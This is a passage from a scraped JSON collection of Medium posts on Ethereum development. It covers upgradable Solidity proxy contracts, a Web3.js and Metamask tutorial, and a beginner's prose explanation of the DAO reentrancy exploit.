contract can overshadow costs in its creation.Proxying helps most in situations where you need many instances of a contract: for example an instance per user, or when creating many instances of a contract type in transactions.Logic UpdatesFundamentally, a proxy outsources its functionality to a contract containing the logic it\u2019s supposed to emulate. In the examples we\u2019ve explored above, that contract is defined by an address present in the storage of the proxy which the contract actually has access to, meaning the proxied contract can actually alter the address to point somewhere else! This was hinted at earlier with the fillAmount accessor returning the integer value of the proxied address, and in fact, we could have changed proxied with a call to drink when the storage layout wasn\u2019t fixed!Let\u2019s imagine a scenario in which we have our Kombucha contract deployed. Sometime later, maybe we will want to update our Kombucha contract so that it is by default capped, and it must be uncapped before it can be filled or drunk. Also, we\u2019ll toss in an extra keccak256 into the return value of drink for good measure (for more reasons, obviously).We will continue this discussion from checkpoint subclass, but the following can apply (with some modifications) to the initialization method approach to proxying as well.Updating the Proxied\u00a0AddressFirst, we want to be able to update proxied in some way. We shouldn\u2019t allow just anybody to do this operation, so let\u2019s restrict it to an owner of the contract. The contract, then, would somehow need to know its owner, and have semantics for dealing with the owner vs. non-owners. Let\u2019s express this concept with an Ownable contract:contract OwnableData {    modifier onlyOwner() {        require(msg.sender == owner);        _;    }    address internal owner;    constructor(address _owner)        public    {        owner = _owner;    }}contract Ownable is OwnableData {    function setOwner(address newOwner)        public        onlyOwner    {        owner = newOwner;    }}There are two ways of going about updating a proxy\u2019s logic. One way is to extend Proxy to be updatable:contract UpdatableProxyData is ProxyData, OwnableData {}contract UpdatableProxyShared is ProxyData, Ownable {    function updateProxied(address newProxied)        public        onlyOwner    {        proxied = newProxied;    }}contract UpdatableProxy is Proxy, UpdatableProxyShared {    constructor(address proxied, address owner)        public        Proxy(proxied)        OwnableData(owner)    {}}contract UpdatableProxyImplementation is UpdatableProxyShared {    constructor() public OwnableData(0) {}}UpdatableProxyImplementation is extraneous in this case where we put updating logic on the proxy, but will be applicable in the case where we put updating logic on the proxied implementation instance.UpdatableProxyData and UpdatableProxy can be nearly drop-in replacements for their non-updatable counterparts:contract KombuchaDataInternal is UpdatableProxyData, KombuchaHeader { ... }contract KombuchaData is UpdatableProxyData, KombuchaHeader { ... }contract KombuchaProxy is UpdatableProxy, KombuchaDataInternal {    function KombuchaProxy(address proxied, address owner, string _flavor, uint _fillAmount, uint _capacity)        public        UpdatableProxy(proxied, owner)    {        // ...    }}Note that now, the KombuchaProxy constructor needs an owner to be specified. Also, with this approach, the logic to update proxied resides inside the proxy itself and cannot be swapped out:This additional logic would also be deployed alongside the proxy, which would make instances of the proxy heavier,\u00a0and\u00a0would essentially\u00a0determine\u00a0the\u00a0upgrading\u00a0process\u00a0from\u00a0the\u00a0start. However, this way also guarantees that as long as there is a valid owner, there will be an update mechanism for the proxied logic.The other approach is to put the updating logic in the proxied contract:contract KombuchaDataInternal is UpdatableProxyData, KombuchaHeader { ... }contract KombuchaData is UpdatableProxyData, KombuchaHeader { ... }contract KombuchaProxy is Proxy, KombuchaDataInternal {    function KombuchaProxy(address proxied, address owner, string _flavor, uint _fillAmount, uint _capacity)        public        Proxy(proxied) OwnableData(owner)    {        // ...    }}contract Kombucha is UpdatableProxyImplementation, KombuchaData {    // ...}With this method, we can just use the generic Proxy as the underlying implementation for KombuchaProxy, as the update functionality is contained in Kombucha itself, through UpdatableProxyImplementation:Since the updating logic is in the proxied contract, we can also change the update procedures/policy per update. For example, we can decide that a version is final and simply ensure all code from that version does not affect proxied in the final update.For the rest of this article, we will mostly assume the use of the second approach here where we place the updating logic in the proxied implementation contract and not the proxy, but the rest of the discussion should apply similarly to the first approach.Authoring an\u00a0UpdateLet\u2019s recall the scenario we are trying to handle. We want to update Kombucha so that:it is by default capped, and it must be uncapped before it can be filled or drunk. Also, we\u2019ll toss in an extra keccak256 into the return value of drink for good measure (for more reasons, obviously).Normally, we might write the updated Kombucha contract as follows:contract Kombucha2 is Kombucha {    bool public capped;        constructor(string flavor, uint fillAmount, uint capacity)        public        Kombucha(flavor, fillAmount, capacity)    {        capped = true;    }    function uncap() public {        require(capped);        capped = false;    }        function fill(uint amountToAdd) public {        require(!capped);        super.fill(amountToAdd);    }    function drink(uint amountToDrink) public returns (bytes32) {        require(!capped);        return keccak256(super.drink(amountToDrink));    }}Before, we might\u2019ve told our customers that from now on, use this new Kombucha2 instead of Kombucha, and if they need to hold on to their old Kombucha instance, then they\u2019re out of luck.Of course since this section is about updatable proxies, we\u2019re going to make it so that they don\u2019t have to do that.Let\u2019s adapt the vanilla update for the multiple inheritance approach to proxies. We will see how normal inheritance might be adapted for this new case:contract Kombucha2DataInternal is KombuchaDataInternal {    bool internal capped;}contract Kombucha2Data is KombuchaData {    bool public capped;}contract Kombucha2Proxy is KombuchaProxy, Kombucha2DataInternal {    function Kombucha2Proxy(address proxied, address owner, string flavor, uint fillAmount, uint capacity)        public        KombuchaProxy(proxied, owner, flavor, fillAmount, capacity)    {        capped = true;    }}contract Kombucha2 is Kombucha, Kombucha2Data {    // updated contract methods, NOT variables and constructor...    // i.e. uncap, fill, and drink from above}This works fine enough on its own, but what happens when we update an existing Kombucha instance to use Kombucha2?Trying to upgrade an existing Kombucha-like instance to that new Kombucha2 logicIt turns out that the update didn\u2019t exactly work as we\u2019ve expected:We\u2019ve introduced capped in the update, but our business requires that variable to start off as true after the update. How can we ensure that when we update the contracts, the contract state adjusts itself accordingly?Storage State MigrationThe problem of maintaining the correctness of an application\u2019s state after a change to the application\u2019s logic is similar to another problem in traditional applications: database migrations. Let\u2019s adapt their methods. We need a way to migrate storage state during an update.First we will modify updateProxied to take an Update instead of the new implementation address:interface Update {    function implementationBefore() external view returns (address);    function implementationAfter() external view returns (address);    function migrateData() external;}contract UpdatableProxyShared is ProxyData, Ownable(0) {    function updateProxied(Update update)        public        onlyOwner    {        require(update.implementationBefore() == proxied);        proxied = update;        Update(this).migrateData();        proxied = update.implementationAfter();    }}Then, we realize the update as follows:contract Kombucha2Update is    KombuchaDataInternal,    Kombucha2DataInternal,    Update{    Kombucha internal kombucha;    Kombucha2 internal kombucha2;    constructor(Kombucha _kombucha, Kombucha2 _kombucha2)        public        OwnableData(0)    {        kombucha = _kombucha;        kombucha2 = _kombucha2;    }    function implementationBefore() external view returns (address)    {        return kombucha;    }        function implementationAfter() external view returns (address) {        return kombucha2;    }        function migrateData() external {        capped = true;    }}To see the mechanics of updating, let\u2019s set up an instance of Kombucha, create a KombuchaProxy which we own, and view it as Kombucha, as before. Then, we\u2019ll create the Kombucha2 to which the proxy will refer:Pretty standard setup, but let\u2019s now view our proxy as a Kombucha2:The capped accessor errors if we try to use it because the proxied Kombucha contract does not support that request. Let\u2019s create an instance of Kombucha2Update using the addresses of the original logic-bearing contracts:The Kombucha2Update contract is designed to be storage-aligned with both Kombucha and Kombucha2. In this case, Kombucha2 has a storage layout which contains the entirety of Kombucha\u2019s storage layout (so the declaration of KombuchaDataInternal in the Kombucha2Update contract\u2019s superclass list was extraneous), but in general, storage schema changes may be tricky to implement. You can see the way that the update accommodates both storage layouts via its header:contract Kombucha2Update is ProxyData, OwnableData(0), KombuchaDataInternal, Kombucha2DataInternal, Update { ... }We will be using data at two storage locations during the update: the update and the proxy. The update storage contains the addresses of the implementationBefore (Kombucha) and the implementationAfter (Kombucha2), which is why we construct the update instance with these parameters. The proxy storage contains the data which is to be migrated. Finally, code at the update describes how storage should be migrated from a Kombucha compatible dataset to a Kombucha2 compatible dataset. This is why, in the modified updateProxied method, we ask the update directly for the implementationBefore and implementationAfter, but we proxy the call to migrateData:require(update.implementationBefore() == proxied);proxied = update;Update(this).migrateData();proxied = update.implementationAfter();Doing this allows us to update Kombucha to Kombucha2, ensuring that capped is set and that migrateData is called only at the time of the update to set capped to true:We\u2019ve successfully updated the proxy to use Kombucha2!Programmable Update\u00a0PoliciesCurrently, our update policy relies on the trustworthiness of an owner, as this owner would be able to update the logic of the contract at any moment. However, in scenarios where a proxy instance is meant to be widely used by many different parties, handing a single authority the power to alter this proxy instance\u2019s implementation on a whim may be too risky. A method of reducing the trust required of an entity in such a role may be desirable.For example, perhaps it is desired that a kombucha contract proxy instance which everybody uses is updated to an address telegraphed at least a couple of months in advance, so any users of that instance may have time to prepare themselves for the event the Kombucha implementation is swapped out for the Kombucha2 implementation.Here is one way to implement this policy:contract TimedUpdatableProxyDataInternal is UpdatableProxyData {    uint internal updateAllowedStartTime;    Update internal plannedUpdate;}contract TimedUpdatableProxyData is UpdatableProxyData {    uint public updateAllowedStartTime;    Update public plannedUpdate;}contract TimedUpdatableProxyShared is UpdatableProxyShared, TimedUpdatableProxyData {    function planUpdate(Update update)        public        onlyOwner    {        plannedUpdate = update;        updateAllowedStartTime = now + 30 seconds;    }    function updateProxied(Update update)        public    {        require(            updateAllowedStartTime != 0 &&            now >= updateAllowedStartTime &&            update == plannedUpdate        );        super.updateProxied(update);        updateAllowedStartTime = 0;        plannedUpdate = Update(0);    }}contract TimedUpdatableProxy is UpdatableProxy, TimedUpdatableProxyShared {    constructor(address proxied, address owner)        public        UpdatableProxy(proxied, owner)    {}}contract TimedUpdatableProxyImplementation is TimedUpdatableProxyShared {    constructor() public OwnableData(0) {}}These are drop-in replacements for their UpdatableProxy counterparts. (Also, the update delay has been set to 30 seconds to avoid waiting forever for testing purposes). While the update is planned, the actual update contract is available on the chain for anyone to inspect, and updateProxied will not work unless the supplied update matches the planned update and the delay has passed.Like the plain updatable contract, this extended update policy may be placed on either proxies or implementations, with similar implications, and this is just an example of what can be done.Further NotesProxy Implementation RefinementsSolidity offers a higher-level construct for performing delegatecalls than at the assembly level. The fallback function for the proxy may be written in the following way:function() public payable {    bool success = proxied.delegatecall(msg.data);    assembly {        let freememstart := mload(0x40)        returndatacopy(freememstart, 0, returndatasize())        switch success        case 0 { revert(freememstart, returndatasize()) }        default { return(freememstart, returndatasize()) }    }}At the time of this writing, the assembly generated from the higher-level version of this code is a little more verbose, but it works, and for clarity, this may be the preferred approach in the future.EIP 897You may be aware of EIP 897, which deals exactly with the proxies discussed in this article. We can implement EIP 897 support on these proxies simply by adding the appropriate methods:contract Proxy is ProxyData {    // ...        function implementation() public view returns (address) {        return proxied;    }    function proxyType() public pure returns (uint256) {        return 1; // for \"forwarding proxy\"                  // see EIP 897 for more details    }}contract UpdatableProxy is Proxy, UpdatableProxyShared {    // ...    function proxyType() public pure returns (uint256) {        return 2; // for \"upgradable proxy\"                  // again, see EIP 897    }}Removing the Extra Storage\u00a0SlotFor simply forwarding proxies, there\u2019s not actually any need to put the implementation address in storage, as it will not change, unlike upgradable proxies. This has been hinted at before (e.g. having to replace cafecafe\u2026 with the appropriate address suggests that the code contains the implementation address directly), and now there is a whole generic proxy factory which creates proxy instances while swapping out the implementation address.There\u2019s a bit of a catch in that it requires the proxy bytecode to be directly loaded into memory for the contract creation call. However, this may change in the future and become directly supported by Solidity without such assembler tricks.Another thing you may notice about these more recent implementations of proxy factories is the presence of a bytes data parameter. This makes these proxy factories a generalization of the init-based approached explored earlier, as the data is used as a subsequent message call to the newly created contract, and may be, for example, a message call to init with certain parameters!Can we remove the requirements which are imposed by the init approach to proxy construction, but keep the generality of this proxy factory? Unfortunately, in order to keep a generic proxy factory, we\u2019d have to deploy the construction code onto the chain somewhere anyway. That entails modifying the underlying generic forwarding proxy to behave something like in the following manner:contract Proxy {    address private constant constructorPlaceholder = 0xCAfEcAfeCAfECaFeCaFecaFecaFECafECafeCaFe;    address private constant implementationPlaceholder = 0xf00Df00dF00dF00dF00DF00Df00df00df00Df00d;    constructor(bytes data) public {        bool success = constructorPlaceholder.delegatecall(data);        if(!success) revert();    }    function() public payable {        bool success = implementationPlaceholder.delegatecall(msg.data);        assembly {            let freememstart := mload(0x40)            returndatacopy(freememstart, 0, returndatasize())            switch success            case 0 { revert(freememstart, returndatasize()) }            default { return(freememstart, returndatasize()) }        }    }}We\u2019d have to deploy code for initialization separately to the chain anyway, perhaps in this form:contract KombuchaConstructor is KombuchaData {    function init(string _flavor, uint _fillAmount, uint _capacity) public {        require(_fillAmount <= _capacity && _capacity > 0);        flavor = _flavor;        fillAmount = _fillAmount;        capacity = _capacity;    }}Also, the generic proxy factory interface would not be ideal for use with client-side libraries at that point, requiring developers to especially format the constructor parameters data which is supposed to be dispatched through the factory to the constructor instance.FinIs Multiple Shadow Clone Jutsu actually an application of this proxy factory\u00a0pattern?To sum up, we can now make cheap copies of our contracts.And we can upgrade them.Thanks for sticking it through this article about delegate proxies, and happy coding!", "responses": "9"}, {"title": "Solidity and\u00a0Web3.js", "author_name": "Yang Nana", "link": "https://medium.com/coinmonks/solidity-and-web3-js-141115b0f8c5?source=search_post", "post_date": "Apr 3, 2018", "readtime": "12 min read", "upvotes": "705", "content": "Solidity and\u00a0Web3.jsReference: cryptozombies.ioYang NanaBlockedUnblockFollowFollowingApr 3, 2018However, there is another way using web3.js which quite different to this, please also read this: https://medium.com/@yangnana11/interacting-with-a-smart-contract-through-web3-js-tutorial-56a7ff2ff153What is\u00a0Web3.js?Remember, the Ethereum network is made up of nodes, which each contain a copy of the blockchain. When you want to call a function on a smart contract, you need to query one of these nodes and tell it:The address of the smart contractThe function you want to call, andThe variables you want to pass to that function.Ethereum nodes only speak a language called JSON-RPC, which isn\u2019t very human-readable. A query to tell the node you want to call a function on a contract looks something like this:// Yeah... Good luck writing all your function calls this way!{\"jsonrpc\":\"2.0\",\"method\":\"eth_sendTransaction\",\"params\":[{\"from\":\"0xb60e8dd61c5d32be8058bb8eb970870f07233155\",\"to\":\"0xd46e8dd67c5d32be8058bb8eb970870f07244567\",\"gas\":\"0x76c0\",\"gasPrice\":\"0x9184e72a000\",\"value\":\"0x9184e72a\",\"data\":\"0xd46e8dd67c5d32be8d46e8dd67c5d32be8058bb8eb970870f072445675058bb8eb970870f072445675\"}],\"id\":1}Luckily, Web3.js hides these nasty queries below the surface, so you only need to interact with a convenient and easily readable JavaScript interface.Instead of needing to construct the above query, calling a function in your code will look something like this:CryptoZombies.methods.createRandomZombie(\"Vitalik Nakamoto \ud83e\udd14\")  .send({ from: \"0xb60e8dd61c5d32be8058bb8eb970870f07233155\", gas: \"3000000\" })1. Getting\u00a0startedDepending on your project\u2019s workflow, you can add Web3.js to your project using most package tools:// Using NPMnpm install web3// Using Yarnyarn add web3// Using Bowerbower install web3// ...etc.Or you can simply download the minified\u00a0.js file from github and include it in your project:<script language=\"javascript\" type=\"text/javascript\" src=\"web3.min.js\"></script>Web3 ProviderRemember, Ethereum is made up of nodes that all share a copy of the same data. Setting a Web3 Provider in Web3.js tells our code which node we should be talking to handle our reads and writes. It\u2019s kind of like setting the URL of the remote web server for your API calls in a traditional web app.You could host your own Ethereum node as a provider. However, there\u2019s a third-party service that makes your life easier so you don\u2019t need to maintain your own Ethereum node in order to provide a DApp for your users\u200a\u2014\u200aInfura.InfuraInfura is a service that maintains a set of Ethereum nodes with a caching layer for fast reads, which you can access for free through their API. Using Infura as a provider, you can reliably send and receive messages to/from the Ethereum blockchain without needing to set up and maintain your own node.You can set up Web3 to use Infura as your web3 provider as follows:var web3 = new Web3(new Web3.providers.WebsocketProvider(\"wss://mainnet.infura.io/ws\"));However, since our DApp is going to be used by many users\u200a\u2014\u200aand these users are going to WRITE to the blockchain and not just read from it\u200a\u2014\u200awe\u2019ll need a way for these users to sign transactions with their private key.Note: Ethereum (and blockchains in general) use a public / private key pair to digitally sign transactions. Think of it like an extremely secure password for a digital signature. That way if I change some data on the blockchain, I can prove via my public key that I was the one who signed it\u200a\u2014\u200abut since no one knows my private key, no one can forge a transaction for me.Cryptography is complicated, so unless you\u2019re a security expert and you really know what you\u2019re doing, it\u2019s probably not a good idea to try to manage users\u2019 private keys yourself in our app\u2019s front-end.But luckily you don\u2019t need to\u200a\u2014\u200athere are already services that handle this for you. The most popular of these is Metamask.MetamaskMetamask is a browser extension for Chrome and Firefox that lets users securely manage their Ethereum accounts and private keys, and use these accounts to interact with websites that are using Web3.js. (If you haven\u2019t used it before, you\u2019ll definitely want to go and install it\u200a\u2014\u200athen your browser is Web3 enabled, and you can now interact with any website that communicates with the Ethereum blockchain!).And as a developer, if you want users to interact with your DApp through a website in their web browser (like we\u2019re doing with our CryptoZombies game), you\u2019ll definitely want to make it Metamask-compatible.Note: Metamask uses Infura\u2019s servers under the hood as a web3 provider, just like we did above\u200a\u2014\u200abut it also gives the user the option to choose their own web3 provider. So by using Metamask\u2019s web3 provider, you\u2019re giving the user a choice, and it\u2019s one less thing you have to worry about in your app.Using Metamask\u2019s web3\u00a0providerMetamask injects their web3 provider into the browser in the global JavaScript object web3. So your app can check to see if web3 exists, and if it does use web3.currentProvider as its provider.Here\u2019s some template code provided by Metamask for how we can detect to see if the user has Metamask installed, and if not tell them they\u2019ll need to install it to use our app:window.addEventListener('load', function() {// Checking if Web3 has been injected by the browser (Mist/MetaMask)  if (typeof web3 !== 'undefined') {    // Use Mist/MetaMask's provider    web3js = new Web3(web3.currentProvider);  } else {    // Handle the case where the user doesn't have web3. Probably     // show them a message telling them to install Metamask in     // order to use our app.    // For example    // web3 = new Web3(new Web3.providers.HttpProvider(\"http://localhost:8545\"));  }  // Now you can start your app & access web3js freely:  startApp()})You can use this boilerplate code in all the apps you create in order to require users to have Metamask to use your DApp.Note: There are other private key management programs your users might be using besides MetaMask, such as the web browser Mist. However, they all implement a common pattern of injecting the variable web3, so the method we describe here for detecting the user's web3 provider will work for these as well.2. Talking to ContractsNow that we\u2019ve initialized Web3.js with MetaMask\u2019s Web3 provider, let\u2019s set it up to talk to our smart contract.Web3.js will need 2 things to talk to your contract: its address and its ABI.Contract AddressAfter you finish writing your smart contract, you will compile it and deploy it to Ethereum. We\u2019re going to cover deployment in the next lesson, but since that\u2019s quite a different process from writing code, we\u2019ve decided to go out of order and cover Web3.js first.After you deploy your contract, it gets a fixed address on Ethereum where it will live forever. The address of the CryptoKitties contract on Ethereum mainnet is YOUR_CONTRACT_ADDRESS.You\u2019ll need to copy this address after deploying in order to talk to your smart contract.Contract ABIThe other thing Web3.js will need to talk to your contract is its ABI.ABI stands for Application Binary Interface. Basically it\u2019s a representation of your contracts\u2019 methods in JSON format that tells Web3.js how to format function calls in a way your contract will understand.When you compile your contract to deploy to Ethereum, the Solidity compiler will give you the ABI, so you\u2019ll need to copy and save this in addition to the contract address.Instantiating a Web3.js\u00a0ContractOnce you have your contract\u2019s address and ABI, you can instantiate it in Web3 as follows:// Instantiate myContractvar myContract = new web3js.eth.Contract(myABI, myContractAddress);3. Calling Contract FunctionsOur contract is all set up! Now we can use Web3.js to talk to it.Web3.js has two methods we will use to call functions on our contract: call and send.Callcall is used for view and pure functions. It only runs on the local node, and won't create a transaction on the blockchain.Review: view and pure functions are read-only and don't change state on the blockchain. They also don't cost any gas, and the user won't be prompted to sign a transaction with MetaMask.Using Web3.js, you would call a function named myMethod with the parameter 123 as follows:myContract.methods.myMethod(123).call()Sendsend will create a transaction and change data on the blockchain. You'll need to use send for any functions that aren't view or pure.Note: sending a transaction will require the user to pay gas, and will pop up their Metamask to prompt them to sign a transaction. When we use Metamask as our web3 provider, this all happens automatically when we call send(), and we don't need to do anything special in our code. Pretty cool!Using Web3.js, you would send a transaction calling a function named myMethod with the parameter 123 as follows:myContract.methods.myMethod(123).send()The syntax is almost identical to call().Getting Zombie\u00a0DataNow let\u2019s look at a real example of using call to access data on our contract.We made our array of zombies public:Zombie[] public zombies;In Solidity, when you declare a variable public, it automatically creates a public \"getter\" function with the same name. So if you wanted to look up the zombie with id 15, you would call it as if it were a function: zombies(15).Here\u2019s how we would write a JavaScript function in our front-end that would take a zombie id, query our contract for that zombie, and return the result:Note: The code we\u2019re using in this lesson are using version 1.0 of Web3.js, which uses promises instead of callbacks. Many other tutorials you\u2019ll see online are using an older version of Web3.js. The syntax changed a lot with version 1.0, so if you\u2019re copying code from other tutorials, make sure they\u2019re using the same version as you!function getZombieDetails(id) {  return cryptoZombies.methods.zombies(id).call()}// Call the function and do something with the result:getZombieDetails(15).then(function(result) {  console.log(\"Zombie 15: \" + JSON.stringify(result));});Let\u2019s walk through what\u2019s happening here.cryptoZombies.methods.zombies(id).call() will communicate with the Web3 provider node and tell it to return the zombie with index id from Zombie[] public zombies on our contract.Note that this is asynchronous, like an API call to an external server. So Web3 returns a promise here. (If you\u2019re not familiar with JavaScript promises\u2026 Time to do some additional homework before continuing!)Once the promise resolves (which means we got an answer back from the web3 provider), our example code continues with the then statement, which logs result to the console.result will be a javascript object that looks like this:{  \"name\": \"H4XF13LD MORRIS'S COOLER OLDER BROTHER\",  \"dna\": \"1337133713371337\",  \"level\": \"9999\",  \"readyTime\": \"1522498671\",  \"winCount\": \"999999999\",  \"lossCount\": \"0\" // Obviously.}We could then have some front-end logic to parse this object and display it in a meaningful way on the front-end.Getting the user\u2019s account in\u00a0MetaMaskMetaMask allows the user to manage multiple accounts in their extension.We can see which account is currently active on the injected web3 variable via:var userAccount = web3.eth.accounts[0]\u2026Now let\u2019s look at using send functions to change data on our smart contract.There are a few major differences from call functions:sending a transaction requires a from address of who's calling the function (which becomes msg.sender in your Solidity code). We'll want this to be the user of our DApp, so MetaMask will pop up to prompt them to sign the transaction.sending a transaction costs gasThere will be a significant delay from when the user sends a transaction and when that transaction actually takes effect on the blockchain. This is because we have to wait for the transaction to be included in a block, and the block time for Ethereum is on average 15 seconds. If there are a lot of pending transactions on Ethereum or if the user sends too low of a gas price, our transaction may have to wait several blocks to get included, and this could take minutes.4. Calling Payable FunctionsIn ZombieHelper contract, we added a payable function where the user can level up:function levelUp(uint _zombieId) external payable {  require(msg.value == levelUpFee);  zombies[_zombieId].level++;}The way to send Ether along with a function is simple, with one caveat: we need to specify how much to send in wei, not Ether.What\u2019s a\u00a0Wei?A wei is the smallest sub-unit of Ether\u200a\u2014\u200athere are 10^18 wei in one ether.That\u2019s a lot of zeroes to count\u200a\u2014\u200abut luckily Web3.js has a conversion utility that does this for us.// This will convert 1 ETH to Weiweb3js.utils.toWei(\"1\", \"ether\");In our DApp, we set levelUpFee = 0.001 ether, so when we call our levelUp function, we can make the user send 0.001 Ether along with it using the following code:CryptoZombies.methods.levelUp(zombieId).send({ from: userAccount, value: web3js.utils.toWei(\"0.001\", \"ether\") })5. Subscribing to\u00a0EventsAs you can see, interacting with your contract via Web3.js is pretty straightforward\u200a\u2014\u200aonce you have your environment set up, calling functions and sending transactions is not all that different from a normal web API.There\u2019s one more aspect we want to cover\u200a\u2014\u200asubscribing to events from your contract.Listening for New\u00a0ZombiesFrom zombiefactory.sol, we had an event called NewZombie that we fired every time a new zombie was created:event NewZombie(uint zombieId, string name, uint dna);In Web3.js, you can subscribe to an event so your web3 provider triggers some logic in your code every time it fires:cryptoZombies.events.NewZombie().on(\"data\", function(event) {  let zombie = event.returnValues;  // We can access this event's 3 return values on the `event.returnValues` object:  console.log(\"A new zombie was born!\", zombie.zombieId, zombie.name, zombie.dna);}).on(\"error\", console.error);Note that this would trigger an alert every time ANY zombie was created in our DApp\u200a\u2014\u200anot just for the current user. What if we only wanted alerts for the current user?Using indexedIn order to filter events and only listen for changes related to the current user, our Solidity contract would have to use the indexed keyword, like we did in the Transfer event of our ERC721 implementation:event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);In this case, because _from and _to are indexed, that means we can filter for them in our event listener in our front end:// Use `filter` to only fire this code when `_to` equals `userAccount`cryptoZombies.events.Transfer({ filter: { _to: userAccount } }).on(\"data\", function(event) {  let data = event.returnValues;  // The current user just received a zombie!  // Do something here to update the UI to show it}).on(\"error\", console.error);As you can see, using events and indexed fields can be quite a useful practice for listening to changes to your contract and reflecting them in your app's front-end.Querying past\u00a0eventsWe can even query past events using getPastEvents, and use the filters fromBlock and toBlock to give Solidity a time range for the event logs (\"block\" in this case referring to the Ethereum block number):cryptoZombies.getPastEvents(\"NewZombie\", { fromBlock: 0, toBlock: \"latest\" }).then(function(events) {  // `events` is an array of `event` objects that we can iterate, like we did above  // This code will get us a list of every zombie that was ever created});Because you can use this method to query the event logs since the beginning of time, this presents an interesting use case: Using events as a cheaper form of storage.If you recall, saving data to the blockchain is one of the most expensive operations in Solidity. But using events is much much cheaper in terms of gas.The tradeoff here is that events are not readable from inside the smart contract itself. But it\u2019s an important use-case to keep in mind if you have some data you want to be historically recorded on the blockchain so you can read it from your app\u2019s front-end.For example, we could use this as a historical record of zombie battles\u200a\u2014\u200awe could create an event for every time one zombie attacks another and who won. The smart contract doesn\u2019t need this data to calculate any future outcomes, but it\u2019s useful data for users to be able to browse from the app\u2019s front-end.Web3.js Events and\u00a0MetaMaskThe syntax we just described above is from the latest 1.0 release of Web3.js, which uses WebSockets to subscribe to events.However, MetaMask doesn\u2019t yet support the latest events API (although they\u2019re actively working on it\u200a\u2014\u200acheck this github issue for updates) (MetaMask version 4.5.1)So for now we\u2019ll have to use a separate Web3 provider that supports WebSockets specifically for the events. We can use Infura to instantiate a second copy as follows:var web3Infura = new Web3(new Web3.providers.WebsocketProvider(\"wss://mainnet.infura.io/ws\"));var czEvents = new web3Infura.eth.Contract(cryptoZombiesABI, cryptoZombiesAddress);Then we would use czEvents.events.Transfer to listen to events instead of cryptoZombies.events.Transfer. We would still use cryptoZombies.methods for everything else we've covered in this lesson.In the future, this won\u2019t be necessary when MetaMask updates their API to support Web3.js 1.0\u200a\u2014\u200abut for right now it\u2019s a necessary stop-gap if we want to start using the nicer Web3.js 1.0 syntax for subscribing to events.\u2764\ufe0f Like, Share, Leave your\u00a0commentIf you like this post, don\u2019t forget to like, share with your friends and colleagues and leave your comment below about the post.And Follow me\u2026\u2026.Get crypto Jobs, Blockchain jobs", "responses": "4"}, {"title": "Explaining the DAO exploit for beginners in\u00a0Solidity", "author_name": "Maria P. Gomez Gelvez", "link": "https://medium.com/@MyPaoG/explaining-the-dao-exploit-for-beginners-in-solidity-80ee84f0d470?source=search_post", "post_date": "Oct 16, 2016", "readtime": "4 min read", "upvotes": "519", "content": "Explaining the DAO exploit for beginners in\u00a0SolidityThe fallback\u00a0functionMaria P. Gomez GelvezBlockedUnblockFollowFollowingOct 16, 2016Yes, another article about the DAO attack BUT this time it is for dummies\u00a0;). I mean, I want to explain the attack in simple terms and steps so beginners, and even non-technical Ethereum enthusiasts, can have a technical understanding of what happened to one of the most popular Ethereum applications. I\u2019m not a software engineer nor an experienced Ethereum developer, I\u2019m just a beginner!The hacker exploited a bug in the code of the DAO and stole more or less $50 million worth of ether. I will focus here only on the main technical issue of the exploit: The fallback function. For a more detailed and advanced recount of the attack, the blog posts by Phil Daian and Peter Vessenes are highly recommended.Basic conceptsTo start off, keep in mind that in Ethereum there are two types of accounts: (i) externally owned accounts controlled by humans and (ii) contract accounts controlled by code. This is important because only contract accounts have associated code, and hence, can have a fallback function.In Ethereum all the action is triggered by transactions or messages (calls) set off by externally owned accounts. Those transactions can be an ether transfer or the triggering of contract code. Remember, contracts can trigger other contracts\u2019 code as well.Smart contracts are written in high-level programming languages such as Solidity but for those contracts to be uploaded on the blockchain, they need to be compiled into bytecode, a low-level programming language executed by the Ethereum Virtual Machine (EVM). Said bytecode can be interpreted with opcodes.When a contract calls or sends money to another contract that code compiles in the EVM bytecode, invoking the call function. But, there is a difference: When calling another contract the call function provides specific function identifiers and data, however, when sending money to another contract, the call function has a set amount of gas but no data (case b below), and thus, triggers the fallback function of the called contract.The attackThe fallback function abuse played a very important role in the DAO attack. Let\u2019s see what a fallback function is and how it can be used for malicious purposes.Fallback functionA contract can have one anonymous function, known as well as the fallback function. This function does not take any arguments and it is triggered in three cases [1]:a. If none of the functions of the call to the contract match any of the functions in the called contractb. When the contract receives ether without extra datac. If no data was suppliedExampleThe following is sample code for a contract vulnerable to a malicious fallback function of another contract. In this example we have two contracts: (i) the contract Bank (vulnerable contract) and (ii) the contract BankAttacker (malicious contract). Imagine that the contract Bank is the DAO smart contract but much more simplified and the contract BankAttacker is the hacker\u2019s malicious smart contract that emptied the DAO.The hacker initiates the interaction with contract Bank through its malicious contract and the sequence of the actions is as follows:The first thing the hacker does is send ether (75 wei) to the vulnerable contract through the deposit function of the malicious contract. This function calls the addToBalance function of the vulnerable contract.Then, the hacker withdraws, through the withdraw function of the malicious contract, the same amount of wei (75), triggering the withdrawBalance function of the vulnerable contract.The withdrawBalance function first sends ether (75 wei) to the malicious contract, triggering its fallback function, and last updates the userBalances variable (that this piece is done last is very important for the attack).The malicious fallback function calls the withdrawBalance function again (recursive call), doubling the withdraw, before the execution of the first withdrawBalance function finishes, and thus, without updating the userBalances variable.In this example, there are only two recursive calls to the withdrawBalance function so the hacker ends up with a balance of 150 wei. They took more than they should (75 wei) because the userBalance variable is the last thing set/updated.One important point is that unlike the JavaScript\u2019s blocks of code, the EVM executes instructions synchronously, one after the other, and this is why the userBalance variable is updated only after the previous code is finished.The following is a more graphic explanation of the example. The instances referred in this graphic are the different states of the contracts saved in the blockchain. In the graphic you will see that the hacker, through his/her/their external account, triggers the malicious contract, so this contract can interact with the vulnerable contract.Last, here is the example in JavaScript, just in case you are not very familiar with Solidity yet.ConclusionI\u2019ve learned a lot understanding the DAO exploit, mainly that programming smart contracts is not an easy task and it should be done rigorously. I still have lots of unsolved questions such as: Do we need fallback functions at all? Apparently this was fixed in the new version of Solidity. However, the problem is still present at the EVM level because a hacker can program in opcode and avoid the Solidity\u2019s security measures.Meanwhile, I\u2019m working with two friends David Jaramillo and Graziano Pirovano (great software engineers) on a software architecture project, which aims to protect programmers from the risks of malicious fallback functions within the current Ethereum ecosystem. More about this project to come!Thank you to Graziano Pirovano y David Jaramillo.Footnotes:[1] http://solidity.readthedocs.io/en/latest/contracts.html", "responses": "4"}, {"title": "How to write upgradable smart contracts in solidity\u00a0!", "author_name": "Himanshu Chawla", "link": "https://medium.com/quillhash/how-to-write-upgradable-smart-contracts-in-solidity-d8f1b95a0e9a?source=search_post", 